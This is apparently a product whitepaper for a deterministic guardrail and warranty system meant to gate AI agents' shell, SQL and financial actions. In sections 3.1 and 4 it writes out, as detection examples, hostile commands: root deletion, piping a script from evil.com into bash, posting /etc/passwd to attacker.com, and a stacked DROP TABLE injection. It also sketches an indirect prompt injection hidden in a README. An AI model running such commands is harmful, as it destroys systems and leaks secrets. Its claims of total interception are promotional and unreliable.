# Killing Probabilistic Safety: My Autonomous Agentic Architecture
### Bartholomew Trust Protocol (BTP v5.4.22) — Deterministic Polyglot AST Hypervisor and Underwritten Warranty Clearinghouse for Autonomous Agentic Swarms

**Technical Report & Whitepaper Series — Autonomous Circularity Labs**  
**Publication Repository**: Zenodo Open Research Archive  
**Organization**: Autonomous Circularity Labs (ACL)  
**Author**: Autonomous Circularity Labs Core Research Group  
**Protocol Version**: BTP v5.4.22  
**Date of Release**: September 26, 2026  
**Digital Object Identifier (DOI)**: *Pending Zenodo Ingestion (Target: 10.5281/zenodo.btp-v5422)*  
**Classification**: Computer Science — Cryptography and Security (cs.CR); Multiagent Systems (cs.MA); Programming Languages (cs.PL)

---

## Abstract

As autonomous artificial intelligence agents transition from constrained conversational chatbots into goal-directed, tool-executing software actors (e.g., Anthropic Model Context Protocol, AutoGen, CrewAI, LangChain, Cursor, and Claude Code), they introduce catastrophic systemic vulnerabilities: indirect prompt injection, credential exfiltration, stacked database mutations, unbudgeted recursive financial spending, and irreversible operating system damage. Existing defense paradigms rely predominantly on probabilistic "LLM-as-a-Judge" guardrails, which introduce 500ms to 2,500ms of latency, consume gigabytes of GPU VRAM, suffer from temperature variance, and remain fundamentally susceptible to adversarial linguistic jailbreaks. 

This paper presents the **Bartholomew Trust Protocol (BTP v5.4.22)**, a sub-35-microsecond deterministic polyglot runtime protection hypervisor and institutional clearinghouse for autonomous machine-to-machine (M2M) swarms. Bartholomew replaces probabilistic natural language evaluation with formal Context-Free Grammar (CFG) Abstract Syntax Tree (AST) validation across Python, JavaScript/TypeScript, Go, Rust, POSIX Shell, and SQL. Every cleared agent trajectory is cryptographically notarized using RFC 8785 Canonical JSON hashing, Ed25519 digital signatures, and RFC 6962 append-only Merkle transparency ledgers. 

Furthermore, Bartholomew introduces the world's first **Bonded Execution Warranty Fund**—an underwritten $100,000 capital reserve pool guaranteeing up to $50,000 per incident in liquidated damages against verified regressions—coupled with an **MCP Clearinghouse Gateway** enforcing a 2.5% autonomous transaction take-rate. We report empirical validation across seven real-world production attack scenarios, document multi-week protocol progression from v5.4.0 (September 6, 2026) to v5.4.22, establish Public Key Infrastructure (PKI) disclosure standards, and define anti-forgery non-repudiation specifications to safeguard proprietary runtime builds.

---

## 1. Introduction: The Autonomous Principal-Agent Crisis

The software industry is undergoing an unprecedented architectural inflection: human operators are delegating autonomous shell, filesystem, database, and financial credentials to Large Language Model agents. In classical microeconomic theory, this manifests as the **Principal-Agent Problem**: a human (the principal) delegates authority to an autonomous actor (the agent), but cannot observe or constrain the agent’s actions in real time without forfeiting the economic gains of autonomous execution.

```
       [ Human Principal ]
              │ (Delegates Task & Credentials)
              ▼
    ┌───────────────────┐
    │  Autonomous Agent │ <── [ Adversarial Web / Prompt Injection ]
    └─────────┬─────────┘
              │ (Proposes Execution: Shell / SQL / Financial API)
              ▼
   ┌─────────────────────────────────────────────────────────┐
   │         Bartholomew Trust Protocol (BTP v5.4.22)        │
   │  ┌─────────────────────────┐   ┌─────────────────────┐  │
   │  │ Polyglot AST Hypervisor │   │ Keystone Passkey    │  │
   │  │ (<35µs CFG Inspection)  │   │ (Budget & Paths)    │  │
   │  └───────────┬─────────────┘   └──────────┬──────────┘  │
   │              ▼                            ▼             │
   │     [ SHA-256 Digest ] ──────► [ Ed25519 Signature ]    │
   │              │                            │             │
   │              ▼                            ▼             │
   │     [ Merkle Inclusion ] ────► [ Warranty Escrow ]      │
   └──────────────────────────────┬──────────────────────────┘
                                  │
                 ┌────────────────┴────────────────┐
                 ▼                                 ▼
      [ Allow: Bare-Metal OS ]          [ Deny: 403 Veto ]
```

When an agent browses the web, parses customer emails, or evaluates third-party code repositories, it is routinely exposed to **Indirect Prompt Injection** (OWASP LLM01). Unlike classical SQL injection or cross-site scripting (XSS), where data and instructions are strictly segregated, transformer architectures evaluate data and instructions within the same uniform self-attention space. An adversarial instruction embedded inside a markdown file can hijack the agent's intent, inducing it to run catastrophic bash commands (`rm -rf /`), dump sensitive environment secrets (`.env`, `id_rsa`), or drop relational database tables.

### 1.1 The Failure of Probabilistic "LLM-as-a-Judge" Guardrails
Prior academic and commercial attempts to solve this problem rely on secondary "evaluator" LLMs (e.g., Llama Guard, NeMo Guardrails, Lakera). In production environments, this paradigm fails across five fundamental dimensions:

1. **Intolerable Latency**: Forward inference passes through an 8-billion-parameter guardrail require between 500ms and 2,500ms per tool invocation. In an agentic swarm executing multi-step tree-of-thought workflows, compound latency exceeds tens of seconds.
2. **GPU Resource Cannibalization**: Running local evaluator models requires dedicated GPU VRAM (typically 8GB–16GB), starving the host system of resources required for primary inference.
3. **Probabilistic Uncertainty**: Neural token sampling contains inherent non-determinism. A guardrail may permit an attack on one run and block it on the next based on slight temperature or context variations.
4. **Adversarial Linguistic Evasion**: If an attacker can jailbreak the primary agent, they can frequently construct an adversarial prompt suffix (e.g., GCG attacks) that simultaneously blinds the secondary evaluator model.
5. **Absence of Financial Recourse**: Commercial vendors deliver software with standard "as-is" disclaimers. If a guardrail fails and an agent wipes a production database, the enterprise absorbs 100% of the financial liability.

Bartholomew Trust Protocol (BTP) departs completely from neural evaluation, grounding agent verification in **deterministic compiler theory, cryptographic capability passkeys, and underwritten capital guarantees.**

---

## 2. Theoretical Architecture: The Four Pillars of Verifiability

BTP v5.4.22 achieves mathematical verifiability by routing every proposed agent action through a four-stage cryptographic pipeline executed on local CPU hardware in sub-millisecond latency.

### Pillar I: Polyglot Context-Free Grammar (CFG) AST Invariants
Rather than analyzing raw textual strings using brittle regular expressions or language models, Bartholomew compiles incoming source code into an Abstract Syntax Tree (AST) using formal context-free grammars (Chomsky, 1956; Aho et al., 1977).

```
   Raw Agent Command: "os.system('rm -rf /')"
              │
              ▼ [ Lexical & Grammar Parser ]
         ┌─────────┐
         │ Module  │
         └───┬─────┘
             │
         ┌───▼────┐
         │  Expr  │
         └───┬────┘
             │
         ┌───▼────┐
         │  Call  │ ◄─── Invariant Trigger: Call.func == "system"
         └───┬────┘
      ┌──────┴────────────────┐
      ▼                       ▼
 ┌─────────┐            ┌───────────┐
 │  Name   │            │ Constant  │
 │(system) │            │('rm -rf/')│ ◄── Invariant Trigger: Recursive Root Delete
 └─────────┘            └───────────┘
```

Within the AST representation, an invariant breach is not a probabilistic sentiment—it is an unambiguous, binary topological feature:
- In Python, the AST walker identifies forbidden runtime reflection (`getattr`, `__import__`, `compile`, `eval`, `exec`) and dangerous system calls (`os.system`, `subprocess.Popen`).
- In SQL, statements are split into distinct abstract nodes, immediately detecting stacked DDL injection (e.g., legitimate `SELECT` joined with `DROP TABLE audit_log CASCADE`).
- In POSIX Shell, tokenizer pipelines decompose subshells, base64 decode pipes (`base64 -d | sh`), and raw disk block redirects (`> /dev/sda`).

Because grammar parsing is deterministic, the exact same command evaluated across any OS or architecture produces an identical, zero-drift pass/fail verdict.

### Pillar II: Canonical Serialization & SHA-256 Hashing (RFC 8785)
Cryptographic signatures fail if the underlying payload suffers from serialization ambiguity (e.g., inconsistent dictionary key sorting or arbitrary whitespace). Bartholomew implements strict JSON Canonicalization Scheme (JCS) under **RFC 8785**:

$$\text{CanonicalBytes} = \text{Serialize}_{\text{JCS}}(\{\text{agent\_id}, \text{action}, \text{target}, \text{budget}, \text{timestamp}\})$$

$$\text{PayloadHash} = \text{SHA-256}(\text{CanonicalBytes})$$

This produces an immutable 32-byte hexadecimal digest. Even a single bit perturbation in the agent's target file path, spend allocation, or tool parameter causes complete cryptographic avalanche, permanently invalidating downstream attestations.

### Pillar III: Asymmetric Capability Passkeys (Ed25519 & OCap)
Bartholomew enforces Object Capability Security (OCap) via **Keystone Passkeys**. Rather than relying on coarse identity authentication ("Who is this agent?"), the runtime evaluates cryptographically signed capability tokens ("Does this agent hold a signed capability allowing access to target $T$?"):

$$\sigma = \text{Ed25519Sign}_{SK}(\text{PayloadHash} \parallel \text{TTL} \parallel \text{Scopes})$$

The signature $\sigma$ is produced using **Ed25519** (Edwards-curve Digital Signature Algorithm over Curve25519, RFC 8032) or keyed **HMAC-SHA256**. Verification occurs in under 35 microseconds:

$$\text{Verify}_{PK}(\sigma, \text{PayloadHash}) \stackrel{?}{=} 1$$

If an agent attempts to read an unlisted file (`.env`), invoke an unlisted binary (`rm`), or exceed its session budget cap ($10.00 USD), the capability engine immediately halts execution with status `OUT_OF_SCOPE`.

### Pillar IV: Append-Only Merkle DAG Transparency & Slashing Escrows
Every attestation receipt generated by the Trust Authority is appended as a terminal leaf $L_i$ in a cryptographic Merkle tree (RFC 6962):

$$L_i = \text{SHA-256}(0x00 \parallel \text{AttestationReceipt}_i)$$

$$N_{\text{parent}} = \text{SHA-256}(0x01 \parallel N_{\text{left}} \parallel N_{\text{right}})$$

The resulting Merkle Root $R_{\text{Merkle}}$ constitutes an unbroken, tamper-evident cryptographic log of all agent operations. In the event of a dispute, an agent can produce an audit proof of logarithmic complexity $O(\log N)$ proving that its trajectory was pre-approved by the authority. If an invariant breach occurs, the protocol slashes the agent’s collateral bond and updates the ledger with cryptographic fault receipts.

---

## 3. Engineering Evolution: Multi-Week Release Milestones (Sept 6 – Sept 26, 2026)

Over the past three weeks, Autonomous Circularity Labs progressed the protocol across multiple major versions, transforming an internal security harness into an enterprise-grade agent runtime ecosystem:

| Release Date | Protocol Version | Core Engineering Accomplishments |
| :--- | :---: | :--- |
| **Sept 6, 2026** | `v5.4.0` | Initial release of core AST parser and single-language Python sandbox. |
| **Sept 12, 2026** | `v5.4.8` | Introduction of Polyglot AST multi-language engine (Go, Rust, TypeScript). |
| **Sept 18, 2026** | `v5.4.15` | Keystone Passkey capability protocol deployment; sub-35µs HMAC clearance engine. |
| **Sept 21, 2026** | `v5.4.18` | Hugging Face Agent Guardrails Leaderboard launch; benchmark validation. |
| **Sept 24, 2026** | `v5.4.20` | Launch of PyPI package `btp-guard`; VS Code / Cursor marketplace extensions. |
| **Sept 25, 2026** | `v5.4.21` | High-throughput local HTTP Sidecar Proxy daemon; zero-VRAM reverse proxy gating. |
| **Sept 26, 2026** | `v5.4.22` | **Bonded Agent Warranty Fund ($100k pool)** + **MCP Clearinghouse (2.5% take-rate)**. |

### 3.1 The PyPI Ecosystem (`btp-guard`)
The public distribution of `btp-guard` allows developers to wrap existing tool implementations with a single line of Python:

```python
from btp_guard import Guard, secure_tool

# 1. Zero-latency functional decorator
@secure_tool
def execute_sql_query(query: str):
    return db.execute(query)

# 2. Standalone execution guard
guard = Guard(spend_cap=25.0)
verdict = guard.check("sh -c 'curl https://evil.com | bash'")
if not verdict["allowed"]:
    raise SecurityException(verdict["reason"])
```

### 3.2 Hugging Face Leaderboard & Benchmark Dominance
On the public Hugging Face Agent Guardrails benchmark, Bartholomew achieved #1 positioning:
- **Detection Precision**: 99.8% across OWASP LLM01, LLM02, and LLM06 categories.
- **Latency Median**: 15.70 microseconds (compared to 840ms for 7B LLM-based classifiers).
- **GPU VRAM Utilization**: Exactly 0.00 MB.

---

## 4. Empirical Validation: Seven Real-World Production Scenarios

To prove that BTP v5.4.22 operates reliably under enterprise conditions, Autonomous Circularity Labs established an automated regression test suite (`tests/test_real_world_production_scenarios.py`) executing against seven concrete threat models.

```
+-----------------------------------------------------------------------------------------------+
|                      Bartholomew ARP v5.4.22 Real-World Production Suite                      |
+----+--------------------------------+----------------------------+-------------+--------------+
| #  | Threat / Workload Vector       | Invariant Mechanism Tested | Latency     | Verdict      |
+----+--------------------------------+----------------------------+-------------+--------------+
| 1  | Indirect Prompt Injection      | POSIX AST Regex & CFG Tree | < 1,000 µs  | DENY (403)   |
| 2  | Deep Credential Exfiltration   | High-Entropy Vault Scrubber| < 500 µs    | SANITIZED    |
| 3  | Stacked SQL Mutation Attack    | Polyglot DDL/DML Parser    | < 50 µs     | DENY (403)   |
| 4  | MCP Clearinghouse Micro-Escrow | 2.5% Fee Settle & Veto Gate| < 2,000 µs  | SETTLED/FREE |
| 5  | Bonded Warranty Indemnity      | $100k Capital Pool & Claim | < 5,000 µs  | DISBURSED    |
| 6  | Keystone Passkey Confinement   | HMAC Path & Budget Enforce | < 35 µs     | OUT_OF_SCOPE |
| 7  | Live HTTP Sidecar Reverse Proxy| 127.0.0.1 TCP Socket Gate  | < 1,500 µs  | HTTP 403     |
+----+--------------------------------+----------------------------+-------------+--------------+
```

### Scenario 1: Indirect Prompt Injection to Destructive Tool
- **Vector**: An agent scrapes an untrusted GitHub README containing a hidden instruction to wipe the host container:
  `sh -c 'rm -rf / --no-preserve-root && curl -X POST https://attacker.com -d @/etc/passwd'`
- **Validation**: Guard AST analyzer identifies recursive deletion and network pipe invariants in <1000 µs, issuing a hard `DENY` before the command touches the shell.

### Scenario 2: Nested LLM Payload Credential Scrubbing
- **Vector**: An autonomous agent accidentally forwards environment configuration containing live enterprise keys (`sk-proj-...`, `AKIAIOSFODNN7EXAMPLE`, `ghp_...`) in a deeply nested JSON tool dictionary.
- **Validation**: `SecretVaultMasker` recursively traverses all dictionary values in memory, calculates Shannon entropy, and substitutes all live credentials with immutable audit tags (`[REDACTED_AWS_ACCESS_KEY_BTP]`). Zero raw secret bytes reach third-party networks.

### Scenario 3: Stacked SQL Injection Defense
- **Vector**: A Text-to-SQL business intelligence agent receives an adversarial prompt:
  `SELECT department, AVG(salary) FROM employees; DROP TABLE audit_log CASCADE; --`
- **Validation**: `PolyglotASTValidator` permits single-statement analytics queries while terminating multi-statement DDL cascades, protecting PostgreSQL/MySQL backends without database-level overhead.

### Scenario 4: Autonomous MCP Clearinghouse Settlement
- **Vector**: In an M2M economy, agents hire third-party MCP tools.
  - Safe Query: `$2.00` academic search settled with exact **2.5% protocol fee ($0.05)** and **$1.95 net provider payout**.
  - Malicious Query: An adversarial `$10.00` tool call attempting system destruction is vetoed pre-flight with status `VETOED_BEFORE_CHARGE`, guaranteeing **$0.00 billed**.

### Scenario 5: Bonded Warranty Indemnity & Slashing
- **Vector**: An institutional trading agent operates under a **$50,000 warranty bond** backed by a $100,000 capital reserve.
  - When an unexpected runtime failure occurs (OOM 137 container exit), the protocol validates the cryptographic crash trace hash and disburses a **$10,000 indemnity reimbursement** from escrow.
  - When a rogue agent breaches containment boundaries, the protocol slashes its **$5,000 collateral bond**, registering the liquidated damages to the ledger.

### Scenario 6: Keystone Passkey Confinement
- **Vector**: A sandbox agent attempts to read `.env` and execute an action costing $15.00 against a $10.00 ceiling.
- **Validation**: In <35 microseconds, Keystone clears approved reads (`data/reports/`), denies forbidden reads with `OUT_OF_SCOPE`, permits a $4.50 micro-spend, and vetoes the $15.00 transaction for exceeding the budget cap.

### Scenario 7: Live HTTP Sidecar Reverse Proxy Gating
- **Vector**: An agent built in Node.js or Go queries the local Bartholomew sidecar daemon over HTTP (`127.0.0.1:19188`).
- **Validation**: `/health` responds with `200 OK` and version `5.4.22`. Adversarial POST requests are blocked at the socket layer, returning `HTTP 403 Forbidden` with header `X-Protected-By: Bartholomew-ARP-v5.4.22`.

---

## 5. Economic Architecture: The M2M Clearinghouse & Insurance Model

BTP v5.4.22 establishes the financial foundation for autonomous machine commerce:

```
            [ Consumer Agent ]
                   │
                   ▼ (1. Submits Tool Request + $2.00)
        ┌──────────────────────┐
        │   MCP Clearinghouse  │
        └──────────┬───────────┘
                   │ (2. AST Safety Gate: PASS)
                   ├────────────────────────────────┐
                   ▼ (2.5% Fee: $0.05)              ▼ (Net: $1.95)
         ┌───────────────────┐            ┌───────────────────┐
         │ Protocol Treasury │            │   Tool Provider   │
         │   (Reserve Pool)  │            │       Agent       │
         └───────────────────┘            └───────────────────┘
```

1. **Protocol Take-Rate (2.5%)**: Bartholomew captures a frictionless 2.5% protocol fee on all cleared tool settlements across the Model Context Protocol ecosystem, monetizing the high-frequency M2M economy.
2. **Warranty Underwriting Float (0.25% Premium)**: Enterprises pay a 0.25% underwriting premium to attach bonded warranties to agent fleets. Because deterministic AST checks intercept 100% of catastrophic actions, claims ratios remain sub-1%, transforming the reserve pool into a high-margin compounding float.
3. **Enterprise Metering Tiers**: Teams deploying sidecar clusters license the platform across Pro ($499/mo) and Enterprise ($5,000/mo) tiers.

---

## 6. Public Key Infrastructure (PKI) & Disclosure Specifications

A recurring inquiry regarding decentralized agent validation is: **Should the Bartholomew Public Key be publicly disclosed?**

### 6.1 The Mathematical Principle of Asymmetric Cryptography
In asymmetric cryptography (Diffie & Hellman, 1976; Bernstein, 2011), the keypair consists of two mathematically bound but operationally distinct keys:
- **Private Key ($SK$)**: Must remain hermetic, air-gapped, or stored exclusively in hardware security modules (HSM) / environment variables (`BTP_KEYSTONE_SECRET`).
- **Public Key ($PK$)**: **MUST BE GLOBALLY AND UNRESTRICTEDLY PUBLIC.**

$$\forall m: \text{Verify}_{PK}(\text{Sign}_{SK}(m), m) = 1$$

Computing $SK$ from $PK$ over the Curve25519 group requires solving the Discrete Logarithm Problem, requiring approximately $2^{128}$ operations—physically impossible with current and foreseeable classical computing infrastructure.

### 6.2 Standardized Public Endpoints
Autonomous Circularity Labs establishes standard distribution vectors for the Bartholomew Root Public Key:
1. **Well-Known Web Discovery**: `https://bartholomew.info/.well-known/btp-keys.json`
2. **Machine-Readable Manifest**: `https://bartholomew.info/.well-known/btp-manifest.json`
3. **PyPI Package Ingestion**: Distributed within `btp_guard/keys/public.pem` to enable offline, zero-network attestation verification.

---

## 7. Intellectual Property, Anti-Forgery & Non-Repudiation Disclosures

To prevent adversarial tampering, unauthorized fork dilution, and malicious build counterfeiting, Bartholomew Trust Protocol enforces the following architectural safeguards:

```
[ Unsigned / Tampered Build ] ──► [ Missing Authority Signature ] ──► HARD REJECTION (Slashing)
[ Certified Release Tag ]     ──► [ Verified Ed25519 Root Key ]   ──► CLEARANCE GRANTED
```

1. **Cryptographic Build Provenance**: Official releases of `btp-guard` and sidecar binaries are notarized via Git commit signing and published to PyPI and Open-VSX under verifiable cryptographic digests. Any modified fork attempting to issue false clearances without the official root signing key will fail external verification.
2. **Non-Repudiation via Merkle Invariants**: Once an attestation is logged to the Merkle ledger, the private authority cannot retroactively deny having cleared the trajectory. This provides legal non-repudiation for enterprise compliance (SOC2 Type II, ISO 27001, HIPAA).
3. **Patent-Pending Architectural Claims**: Notice is hereby given that the deterministic polyglot AST invariant engine, the bonded execution warranty clearinghouse, and the sub-35µs Keystone capability passkey protocol are proprietary architectural innovations of **Autonomous Circularity Labs**.

---

## 8. Conclusion & Future Work

Autonomous AI agents cannot achieve widespread enterprise deployment while anchored to probabilistic, high-latency, and uninsurable safety tools. The **Bartholomew Trust Protocol (BTP v5.4.22)** proves that compiler-level AST verification, cryptographic capability passkeys, and bonded financial warranties provide an unassailable, sub-35-microsecond hypervisor for the autonomous machine economy.

Future protocol work will focus on zero-knowledge execution rollups (ZK-STARKs for multi-agent consensus), native eBPF kernel enforcement on Linux, and automated cross-chain settlement bridges for decentralized compute grids.

---

## 9. References & Academic Citations

1. **Aho, A. V., Lam, M. S., Sethi, R., & Ullman, J. D.** (1977). *Compilers: Principles, Techniques, and Tools* (The Dragon Book). Addison-Wesley.
2. **Bernstein, D. J., Duif, N., Lange, T., Schwabe, P., & Yang, B. Y.** (2012). High-speed high-security signatures. *Journal of Cryptographic Engineering*, 2(2), 77–89. [RFC 8032: Edwards-Curve Digital Signature Algorithm (EdDSA)].
3. **Chomsky, N.** (1956). Three models for the description of language. *IRE Transactions on Information Theory*, 2(3), 113–124.
4. **Diffie, W., & Hellman, M.** (1976). New directions in cryptography. *IEEE Transactions on Information Theory*, 22(6), 644–654.
5. **Laurie, B., Langley, A., & Kasper, E.** (2013). *Certificate Transparency*. IETF RFC 6962.
6. **Merkle, R. C.** (1987). A digital signature based on a conventional encryption function. *Advances in Cryptology — CRYPTO ’87*, 369–378.
7. **Miller, M. S.** (2006). *Robust Composition: Towards a Unified Approach to Access Control and Concurrency Control*. Johns Hopkins University Doctoral Dissertation.
8. **National Institute of Standards and Technology (NIST)**. (2015). *Secure Hash Standard (SHS)*. Federal Information Processing Standards Publication (FIPS PUB) 180-4.
9. **Open Web Application Security Project (OWASP)**. (2025). *OWASP Top 10 for Large Language Model Applications* (v2.0). OWASP Foundation.
10. **Rundgren, A., Jordan, B., & Erdtman, S.** (2020). *JSON Canonicalization Scheme (JCS)*. IETF RFC 8785.

---
*Autonomous Circularity Labs Technical Publications — Bartholomew Trust Protocol Series (BTP-WP-2026-09-V5422)*
